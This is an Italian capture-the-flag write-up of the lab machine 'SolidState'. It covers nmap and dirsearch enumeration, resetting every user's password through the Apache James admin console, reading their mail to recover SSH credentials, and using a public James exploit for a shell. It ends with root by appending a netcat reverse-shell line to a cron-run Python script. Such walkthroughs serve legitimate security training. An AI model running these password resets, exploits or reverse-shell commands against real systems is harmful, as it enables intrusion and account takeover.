# SolidState

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.51
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.51
Host is up (0.073s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.8 [10.10.14.8])
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Home - Solid State Security
|_http-server-header: Apache/2.4.25 (Debian)
110/tcp open  pop3    JAMES pop3d 2.3.2
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
119/tcp open  nntp    JAMES nntpd (posting ok)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/27%OT=22%CT=1%CU=34072%PV=Y%DS=2%DC=I%G=Y%TM=6513E54
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%CI=I%TS=8)SEQ(SP=1
OS:03%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)SEQ(SP=103%GCD=1%ISR=10B%TI=Z%II=I%
OS:TS=8)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5
OS:=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=
OS:7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
OS:%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: solidstate; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumeration

Innanzitutto, vedo cosa c'è sulla porta 80:

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-1.png" />
</p>

Utilizzo _dirsearch_, dal quale ottengo il seguente risultato:

```text
Target: http://10.10.10.51/

[04:18:14] Starting:
[04:18:17] 403 -  297B  - /.ht_wsr.txt
[04:18:17] 403 -  300B  - /.htaccess.bak1
[04:18:17] 403 -  300B  - /.htaccess.orig
[04:18:17] 403 -  300B  - /.htaccess.save
[04:18:17] 403 -  302B  - /.htaccess.sample
[04:18:18] 403 -  301B  - /.htaccess_extra
[04:18:18] 403 -  298B  - /.htaccess_sc
[04:18:18] 403 -  300B  - /.htaccess_orig
[04:18:18] 403 -  298B  - /.htaccessOLD
[04:18:18] 403 -  290B  - /.htm
[04:18:18] 403 -  299B  - /.htaccessOLD2
[04:18:18] 403 -  298B  - /.htaccessBAK
[04:18:18] 403 -  291B  - /.html
[04:18:18] 403 -  300B  - /.htpasswd_test
[04:18:18] 403 -  297B  - /.httr-oauth
[04:18:18] 403 -  296B  - /.htpasswds
[04:18:23] 200 -   17KB - /LICENSE.txt
[04:18:24] 200 -  963B  - /README.txt
[04:18:27] 200 -    7KB - /about.html
[04:18:39] 200 -    1KB - /assets/
[04:18:40] 301 -  311B  - /assets  ->  http://10.10.10.51/assets/
[04:18:55] 200 -    2KB - /images/
[04:18:55] 301 -  311B  - /images  ->  http://10.10.10.51/images/
[04:18:56] 200 -    8KB - /index.html
[04:19:13] 403 -  300B  - /server-status/
[04:19:13] 403 -  299B  - /server-status

Task Completed
```

Non trovando nulla di interessante visito la pagina http://10.10.10.51:4555:

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-2.png" />
</p>

Facendo una rapida ricerca tramite _searchsploit_ trovo questo:

```text
----------------------------------------------- ---------------------------------
 Exploit Title                                 |  Path
----------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Crea | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Exe | linux/remote/35513.py
Apache James Server 2.3.2 - Remote Command Exe | linux/remote/50347.py
----------------------------------------------- ---------------------------------
```

Scarico il terzo file della lista e studio il suo funzionamento. Per poter utilizzarlo occorrono le credenziali.

Provo a connettermi tramite netcat alla porta 4555:

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-3.png" />
</p>

## Exploitation

Utilizzo il comando HELP per stampare la lista dei comandi disponibili:

```text
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```

Utilizzo il comando _listusers_:

```text
Existing accounts 6
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Successivamente, utilizzo il comando _setpassword_ per cambiare la password in **password** a tutti gli utenti della lista.

```text
setpassword james password
Password for james reset
setpassword thomas password
Password for thomas reset
setpassword john password
Password for john reset
setpassword mindy password
Password for mindy reset
setpassword mailadmin password
Password for mailadmin reset
```

Ora provo ad accedere, tramite il comando _telnet_, alla porta 110. Per farlo utilizzo le credenziali degli utenti precedentemente ottenute (e modificate).

Gli unici utenti che hanno materiale interessante sono john e mindy.

**JOHN**

```text
telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER john
+OK
PASS password
+OK Welcome john
LIST
+OK 1 743
1 743
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John,

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
```

**MINDY**

```text
telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER mindy
+OK
PASS password
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security.

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
```

**Ho ottenuto le credenziali per l'utente mindy!**

Ora che ho le credenziali posso utilizzarle nello script scaricato precedentemente tramite _searchsploit_:

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-4.png" />
</p>

Cosi facendo ottengo una reverse shell per l'utente mindy e conquisto il primo flag:

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-5.png" />
</p>


## Privilege Escalation

Scarico ed eseguo gli script _LinEnum.sh_ e _pspy_ e scopro che c'è un file _/opt/tmp.py_ che viene eseguito molto frequentemente e sul quale tutti hanno i massimi privilegi:

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-6.png" />
</p>

Quindi cambio il conenuto del file per creare una reverse shell con privilegi root:

```text
echo "os.system('/bin/nc -e /bin/bash 10.10.14.8 9999')" >> /opt/tmp.py
```

Avvio un listener e attendo l'esecuzione del cron job.

**Dopo qualche minuto sono root!**

<p align="center">
  <img src="/Immagini/Linux-Box/SolidState/solidstate-7.png" />
</p>
